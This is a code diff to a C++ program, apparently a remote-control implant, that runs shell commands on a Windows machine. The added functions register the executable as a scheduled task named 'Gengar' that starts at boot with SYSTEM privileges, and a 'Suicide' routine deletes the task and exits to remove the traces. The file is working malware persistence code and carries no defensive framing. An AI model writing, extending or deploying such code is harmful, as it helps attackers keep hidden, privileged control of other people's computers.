@@ -1,8 +1,16 @@
 #include <iostream>
+#include <sstream>
 #include <boost/process.hpp>
 #include "machine.h"
 
 namespace bp = boost::process;
+const std::string TASK_NAME = "Gengar";
+
+std::string quotify(std::string str)
+{
+	return '"' + str + '"';
+}
+
 void ReadStream(bp::ipstream& stream, std::string& output)
 {
 	std::string buff;
@@ -15,7 +23,7 @@ void ReadStream(bp::ipstream& stream, std::string& output)
 	}
 }
 
-std::string Machine::RunShellCommand(std::string& cmd)
+std::string Machine::RunShellCommand(std::string&& cmd)
 {
 	std::string output;
 	bp::ipstream out_stream, err_stream;
@@ -24,4 +32,21 @@ std::string Machine::RunShellCommand(std::string& cmd)
 	ReadStream(out_stream, output);
 	ReadStream(err_stream, output);
 	return output;
+}
+
+void Machine::MakePersistent()
+{
+	std::ostringstream cmd;
+	const short buff_size = 128;
+	char exe_path[buff_size];
+
+	GetModuleFileNameA(nullptr, exe_path, buff_size);
+	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
+	std::string output = RunShellCommand(std::move(cmd.str()));
+}
+
+void Machine::Suicide()
+{
+	RunShellCommand("schtasks /Delete /F /TN " + TASK_NAME);
+	std::exit(0);
 }
